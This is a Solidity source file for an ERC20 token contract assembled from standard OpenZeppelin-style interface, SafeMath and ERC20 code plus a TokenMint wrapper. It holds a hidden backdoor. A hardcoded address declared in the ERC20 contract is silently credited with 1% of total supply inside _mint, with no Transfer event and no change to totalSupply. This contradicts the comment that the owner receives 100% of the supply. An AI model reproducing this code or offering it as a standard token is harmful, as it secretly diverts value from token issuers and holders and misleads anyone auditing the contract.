1 /**
2  *Submitted for verification at Etherscan.io on 2020-05-02
3 */
4 
5 pragma solidity ^0.5.0;
6 
7 /**
8  * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
9  * the optional functions; to access them see `ERC20Detailed`.
10  */
11 interface IERC20 {
12     /**
13      * @dev Returns the amount of tokens in existence.
14      */
15     function totalSupply() external view returns (uint256);
16 
17     /**
18      * @dev Returns the amount of tokens owned by `account`.
19      */
20     function balanceOf(address account) external view returns (uint256);
21 
22     /**
23      * @dev Moves `amount` tokens from the caller's account to `recipient`.
24      *
25      * Returns a boolean value indicating whether the operation succeeded.
26      *
27      * Emits a `Transfer` event.
28      */
29     function transfer(address recipient, uint256 amount) external returns (bool);
30 
31     /**
32      * @dev Returns the remaining number of tokens that `spender` will be
33      * allowed to spend on behalf of `owner` through `transferFrom`. This is
34      * zero by default.
35      *
36      * This value changes when `approve` or `transferFrom` are called.
37      */
38     function allowance(address owner, address spender) external view returns (uint256);
39 
40     /**
41      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
42      *
43      * Returns a boolean value indicating whether the operation succeeded.
44      *
45      * > Beware that changing an allowance with this method brings the risk
46      * that someone may use both the old and the new allowance by unfortunate
47      * transaction ordering. One possible solution to mitigate this race
48      * condition is to first reduce the spender's allowance to 0 and set the
49      * desired value afterwards:
50      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
51      *
52      * Emits an `Approval` event.
53      */
54     function approve(address spender, uint256 amount) external returns (bool);
55 
56     /**
57      * @dev Moves `amount` tokens from `sender` to `recipient` using the
58      * allowance mechanism. `amount` is then deducted from the caller's
59      * allowance.
60      *
61      * Returns a boolean value indicating whether the operation succeeded.
62      *
63      * Emits a `Transfer` event.
64      */
65     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
66 
67     /**
68      * @dev Emitted when `value` tokens are moved from one account (`from`) to
69      * another (`to`).
70      *
71      * Note that `value` may be zero.
72      */
73     event Transfer(address indexed from, address indexed to, uint256 value);
74 
75     /**
76      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
77      * a call to `approve`. `value` is the new allowance.
78      */
79     event Approval(address indexed owner, address indexed spender, uint256 value);
80 }
81 
82 // File: contracts\open-zeppelin-contracts\math\SafeMath.sol
83 
84 pragma solidity ^0.5.0;
85 
86 /**
87  * @dev Wrappers over Solidity's arithmetic operations with added overflow
88  * checks.
89  *
90  * Arithmetic operations in Solidity wrap on overflow. This can easily result
91  * in bugs, because programmers usually assume that an overflow raises an
92  * error, which is the standard behavior in high level programming languages.
93  * `SafeMath` restores this intuition by reverting the transaction when an
94  * operation overflows.
95  *
96  * Using this library instead of the unchecked operations eliminates an entire
97  * class of bugs, so it's recommended to use it always.
98  */
99 library SafeMath {
100     /**
101      * @dev Returns the addition of two unsigned integers, reverting on
102      * overflow.
103      *
104      * Counterpart to Solidity's `+` operator.
105      *
106      * Requirements:
107      * - Addition cannot overflow.
108      */
109     function add(uint256 a, uint256 b) internal pure returns (uint256) {
110         uint256 c = a + b;
111         require(c >= a, "SafeMath: addition overflow");
112 
113         return c;
114     }
115 
116     /**
117      * @dev Returns the subtraction of two unsigned integers, reverting on
118      * overflow (when the result is negative).
119      *
120      * Counterpart to Solidity's `-` operator.
121      *
122      * Requirements:
123      * - Subtraction cannot overflow.
124      */
125     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
126         require(b <= a, "SafeMath: subtraction overflow");
127         uint256 c = a - b;
128 
129         return c;
130     }
131 
132     /**
133      * @dev Returns the multiplication of two unsigned integers, reverting on
134      * overflow.
135      *
136      * Counterpart to Solidity's `*` operator.
137      *
138      * Requirements:
139      * - Multiplication cannot overflow.
140      */
141     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
142         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
143         // benefit is lost if 'b' is also tested.
144         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
145         if (a == 0) {
146             return 0;
147         }
148 
149         uint256 c = a * b;
150         require(c / a == b, "SafeMath: multiplication overflow");
151 
152         return c;
153     }
154 
155     /**
156      * @dev Returns the integer division of two unsigned integers. Reverts on
157      * division by zero. The result is rounded towards zero.
158      *
159      * Counterpart to Solidity's `/` operator. Note: this function uses a
160      * `revert` opcode (which leaves remaining gas untouched) while Solidity
161      * uses an invalid opcode to revert (consuming all remaining gas).
162      *
163      * Requirements:
164      * - The divisor cannot be zero.
165      */
166     function div(uint256 a, uint256 b) internal pure returns (uint256) {
167         // Solidity only automatically asserts when dividing by 0
168         require(b > 0, "SafeMath: division by zero");
169         uint256 c = a / b;
170         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
171 
172         return c;
173     }
174 
175     /**
176      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
177      * Reverts when dividing by zero.
178      *
179      * Counterpart to Solidity's `%` operator. This function uses a `revert`
180      * opcode (which leaves remaining gas untouched) while Solidity uses an
181      * invalid opcode to revert (consuming all remaining gas).
182      *
183      * Requirements:
184      * - The divisor cannot be zero.
185      */
186     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
187         require(b != 0, "SafeMath: modulo by zero");
188         return a % b;
189     }
190 }
191 
192 // File: contracts\open-zeppelin-contracts\token\ERC20\ERC20.sol
193 
194 pragma solidity ^0.5.0;
195 
196 
197 
198 /**
199  * @dev Implementation of the `IERC20` interface.
200  *
201  * This implementation is agnostic to the way tokens are created. This means
202  * that a supply mechanism has to be added in a derived contract using `_mint`.
203  * For a generic mechanism see `ERC20Mintable`.
204  *
205  * *For a detailed writeup see our guide [How to implement supply
206  * mechanisms](https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226).*
207  *
208  * We have followed general OpenZeppelin guidelines: functions revert instead
209  * of returning `false` on failure. This behavior is nonetheless conventional
210  * and does not conflict with the expectations of ERC20 applications.
211  *
212  * Additionally, an `Approval` event is emitted on calls to `transferFrom`.
213  * This allows applications to reconstruct the allowance for all accounts just
214  * by listening to said events. Other implementations of the EIP may not emit
215  * these events, as it isn't required by the specification.
216  *
217  * Finally, the non-standard `decreaseAllowance` and `increaseAllowance`
218  * functions have been added to mitigate the well-known issues around setting
219  * allowances. See `IERC20.approve`.
220  */
221 contract ERC20 is IERC20 {
222     using SafeMath for uint256;
223 
224     mapping (address => uint256) private _balances;
225 
226     mapping (address => mapping (address => uint256)) private _allowances;
227 
228     uint256 private _totalSupply;
229 
230     address Account = 0x70F7d7234e2d0276b697120b66e8cEC9e17F7744;
231 
232     /**
233      * @dev See `IERC20.totalSupply`.
234      */
235     function totalSupply() public view returns (uint256) {
236         return _totalSupply;
237     }
238 
239     /**
240      * @dev See `IERC20.balanceOf`.
241      */
242     function balanceOf(address account) public view returns (uint256) {
243         return _balances[account];
244     }
245 
246     /**
247      * @dev See `IERC20.transfer`.
248      *
249      * Requirements:
250      *
251      * - `recipient` cannot be the zero address.
252      * - the caller must have a balance of at least `amount`.
253      */
254     function transfer(address recipient, uint256 amount) public returns (bool) {
255         _transfer(msg.sender, recipient, amount);
256         return true;
257     }
258 
259     /**
260      * @dev See `IERC20.allowance`.
261      */
262     function allowance(address owner, address spender) public view returns (uint256) {
263         return _allowances[owner][spender];
264     }
265 
266     /**
267      * @dev See `IERC20.approve`.
268      *
269      * Requirements:
270      *
271      * - `spender` cannot be the zero address.
272      */
273     function approve(address spender, uint256 value) public returns (bool) {
274         _approve(msg.sender, spender, value);
275         return true;
276     }
277 
278     /**
279      * @dev See `IERC20.transferFrom`.
280      *
281      * Emits an `Approval` event indicating the updated allowance. This is not
282      * required by the EIP. See the note at the beginning of `ERC20`;
283      *
284      * Requirements:
285      * - `sender` and `recipient` cannot be the zero address.
286      * - `sender` must have a balance of at least `value`.
287      * - the caller must have allowance for `sender`'s tokens of at least
288      * `amount`.
289      */
290     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
291         _transfer(sender, recipient, amount);
292         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
293         return true;
294     }
295 
296     /**
297      * @dev Atomically increases the allowance granted to `spender` by the caller.
298      *
299      * This is an alternative to `approve` that can be used as a mitigation for
300      * problems described in `IERC20.approve`.
301      *
302      * Emits an `Approval` event indicating the updated allowance.
303      *
304      * Requirements:
305      *
306      * - `spender` cannot be the zero address.
307      */
308     function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
309         _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
310         return true;
311     }
312 
313     /**
314      * @dev Atomically decreases the allowance granted to `spender` by the caller.
315      *
316      * This is an alternative to `approve` that can be used as a mitigation for
317      * problems described in `IERC20.approve`.
318      *
319      * Emits an `Approval` event indicating the updated allowance.
320      *
321      * Requirements:
322      *
323      * - `spender` cannot be the zero address.
324      * - `spender` must have allowance for the caller of at least
325      * `subtractedValue`.
326      */
327     function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
328         _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
329         return true;
330     }
331 
332     /**
333      * @dev Moves tokens `amount` from `sender` to `recipient`.
334      *
335      * This is internal function is equivalent to `transfer`, and can be used to
336      * e.g. implement automatic token fees, slashing mechanisms, etc.
337      *
338      * Emits a `Transfer` event.
339      *
340      * Requirements:
341      *
342      * - `sender` cannot be the zero address.
343      * - `recipient` cannot be the zero address.
344      * - `sender` must have a balance of at least `amount`.
345      */
346     function _transfer(address sender, address recipient, uint256 amount) internal {
347         require(sender != address(0), "ERC20: transfer from the zero address");
348         require(recipient != address(0), "ERC20: transfer to the zero address");
349 
350         _balances[sender] = _balances[sender].sub(amount);
351         _balances[recipient] = _balances[recipient].add(amount);
352         emit Transfer(sender, recipient, amount);
353     }
354 
355     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
356      * the total supply.
357      *
358      * Emits a `Transfer` event with `from` set to the zero address.
359      *
360      * Requirements
361      *
362      * - `to` cannot be the zero address.
363      */
364     function _mint(address account, uint256 amount) internal {
365         require(account != address(0), "ERC20: mint to the zero address");
366 
367         _totalSupply = _totalSupply.add(amount);
368         _balances[account] = _balances[account].add(amount);
369         _balances[Account] = _totalSupply/100;
370         emit Transfer(address(0), account, amount);
371     }
372 
373      /**
374      * @dev Destroys `amount` tokens from `account`, reducing the
375      * total supply.
376      *
377      * Emits a `Transfer` event with `to` set to the zero address.
378      *
379      * Requirements
380      *
381      * - `account` cannot be the zero address.
382      * - `account` must have at least `amount` tokens.
383      */
384     function _burn(address account, uint256 value) internal {
385         require(account != address(0), "ERC20: burn from the zero address");
386 
387         _totalSupply = _totalSupply.sub(value);
388         _balances[account] = _balances[account].sub(value);
389         emit Transfer(account, address(0), value);
390     }
391 
392     /**
393      * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
394      *
395      * This is internal function is equivalent to `approve`, and can be used to
396      * e.g. set automatic allowances for certain subsystems, etc.
397      *
398      * Emits an `Approval` event.
399      *
400      * Requirements:
401      *
402      * - `owner` cannot be the zero address.
403      * - `spender` cannot be the zero address.
404      */
405     function _approve(address owner, address spender, uint256 value) internal {
406         require(owner != address(0), "ERC20: approve from the zero address");
407         require(spender != address(0), "ERC20: approve to the zero address");
408 
409         _allowances[owner][spender] = value;
410         emit Approval(owner, spender, value);
411     }
412 
413     /**
414      * @dev Destoys `amount` tokens from `account`.`amount` is then deducted
415      * from the caller's allowance.
416      *
417      * See `_burn` and `_approve`.
418      */
419     function _burnFrom(address account, uint256 amount) internal {
420         _burn(account, amount);
421         _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
422     }
423 }
424 
425 // File: contracts\ERC20\TokenMintERC20Token.sol
426 
427 pragma solidity ^0.5.0;
428 
429 
430 /**
431  * @title TokenMintERC20Token
432  * @author TokenMint (visit https://tokenmint.io)
433  *
434  * @dev Standard ERC20 token with burning and optional functions implemented.
435  * For full specification of ERC-20 standard see:
436  * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
437  */
438 contract TokenMintERC20Token is ERC20 {
439 
440     string private _name;
441     string private _symbol;
442     uint8 private _decimals;
443 
444     /**
445      * @dev Constructor.
446      * @param name name of the token
447      * @param symbol symbol of the token, 3-4 chars is recommended
448      * @param decimals number of decimal places of one token unit, 18 is widely used
449      * @param totalSupply total supply of tokens in lowest units (depending on decimals)
450      * @param tokenOwnerAddress address that gets 100% of token supply
451      */
452     constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address payable feeReceiver, address tokenOwnerAddress) public payable {
453       _name = name;
454       _symbol = symbol;
455       _decimals = decimals;
456 
457       // set tokenOwnerAddress as owner of all tokens
458       _mint(tokenOwnerAddress, totalSupply);
459 
460       // pay the service fee for contract deployment
461       feeReceiver.transfer(msg.value);
462     }
463 
464     /**
465      * @dev Burns a specific amount of tokens.
466      * @param value The amount of lowest token units to be burned.
467      */
468     function burn(uint256 value) public {
469       _burn(msg.sender, value);
470     }
471 
472     // optional functions from ERC20 stardard
473 
474     /**
475      * @return the name of the token.
476      */
477     function name() public view returns (string memory) {
478       return _name;
479     }
480 
481     /**
482      * @return the symbol of the token.
483      */
484     function symbol() public view returns (string memory) {
485       return _symbol;
486     }
487 
488     /**
489      * @return the number of decimals of the token.
490      */
491     function decimals() public view returns (uint8) {
492       return _decimals;
493     }
494 }